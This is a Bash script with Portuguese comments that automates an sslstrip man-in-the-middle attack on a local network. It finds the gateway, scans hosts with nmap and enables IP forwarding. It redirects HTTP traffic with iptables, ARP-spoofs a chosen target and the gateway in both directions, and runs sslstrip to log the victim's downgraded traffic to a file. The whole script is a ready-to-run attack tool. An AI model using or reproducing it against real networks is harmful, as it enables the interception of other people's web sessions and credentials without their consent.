#!/bin/bash
# Script para automatizar o ataque sslstrip
# Historico: 12-07-2016 v0.1
#
# Pacotes requeridos: sslstrip, dsniff, nmap, figlet e xterm
#
# Autor: Joao Lucas <joaolucas@linuxmail.org>
#

DATA=$(date +'%d-%m-%Y-%H-%M')
PREFIX=/home/jsouza/
ARQ=cap_$DATA.log
BANNER=$(figlet -f block -c "souz4")

menu(){
	echo -e "\033[0;37m $BANNER\033[0m" 
	echo -e "############salvando em: cap_$DATA.log###############"
	echo -e " \033[1;34m 1.\033[0m Identificar gateway" 
	echo -e " \033[1;34m 2.\033[0m Identidicar hosts"
	echo -e " \033[1;34m 3.\033[0m Iniciar" 
	echo -e " \033[1;34m 4.\033[0m Instalar dependencias(Debian e derivados)"
	echo -e " \033[1;34m 5.\033[0m Sair" 
	read -p "> Opção: " opt
	
	case $opt in
		1) get_router ;;
		2) scan_target ;;
		3) iniciar_ataque ;;
		4) install_req ;;
		99) exit 0 ;;
		*) echo "Opção Invalida!" ; menu ;;
	esac
}

get_router(){
	ip_router=$(route -n | awk '{print $2}' | grep [1-9])
	if [ $? -eq 0 ]
	then
		#echo -e "> GATEWAY: $ip_router"
		echo -e "\n \033[1;33m ~ GATEWAY: $ip_router \033[0m" 
		menu
	else
		echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros!"
		sleep 2
		exit 0
	fi
}

scan_target(){
	REDE=$(route | awk '{print $1}' | grep 0$)
	nmap -Pn -T3 $REDE/24 > scan_hosts.txt 2> /dev/null
	if [ $? -eq 0 ]	
	then
		echo -e " \033[1;33m ~ Esses foram os hosts encontrados! \033[0m"
		egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' scan_hosts.txt | awk '{print $5}' | grep [1-9]
		echo " ~ Escolha o alvo."
		menu
	else
		echo -e "\n[\033[0;31m FALHA\033[0m ] Ocorreram erros em encontrar os hosts"
		sleep 2
		exit 0
	fi
}

iniciar_ataque(){ 
	# Ativando o ip forward, para permitir o roteamento de pacotes entre as interfaces de rede"
	echo 1 > /proc/sys/net/ipv4/ip_forward
	# Limpando regras da tabela NAT do iptables"
	iptables -t nat -F
	# Redirecionando o trafego da porta 80 para 10000"
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	if [ $? -eq 0 ]
	then
		echo -e "\n [\033[0;32m OK\033[0m ] Regras criadas com sucesso!"	
 		read -p "> TARGET: " ip_target
		read -p "> GATEWAY: " ip_router
		nohup xterm -e 2> /dev/null "arpspoof -i eth0 $ip_router -t $ip_target" &
		nohup xterm -e 2> /dev/null "arpspoof -i eth0 -t $ip_target $ip_router" &
		echo -e "\n ~ Iniciando o sslstrip..."
		#touch $ARQ
		echo "DATA: $DATA" > $ARQ
		nohup xterm -e 2> /dev/null "nice -n -10 tail -f $ARQ 2> /dev/null" &
		nohup xterm -e 2> /dev/null "sslstrip -l 10000 -w $ARQ" &		
		#echo "~ Vizualizando o arquivo..."
		#nice -n -20 tail -f $ARQ
	else
		echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros em criar regras."
		sleep 2
		exit 0
	fi
}

install_req(){
	# Essa opção só esta disponivel para debian e derivados
	echo -e "\n ~ Atualizando  a lista de repositórios..." 
	apt-get update
	echo -e "\n ~ Instalando os pocotes requeridos..."
	apt-get install dsniff sslstrip xterm figlet nmap -y
	if [ $? -eq 0 ]
	then
		echo -e "\n [\033[0;32m OK\033[0m ] Os pacotes necessários foram instalados!"
	else
		echo -e "\n [\033[0;31m FALHA\033[0m ] Os pacotes não foram encontrados."
	fi
}

while true
do
	if [ $UID -eq 0 ]
	then
		clear
		menu
	else
		echo "~ Execute o script como root!"
		sleep 3
		exit 0
	fi
done
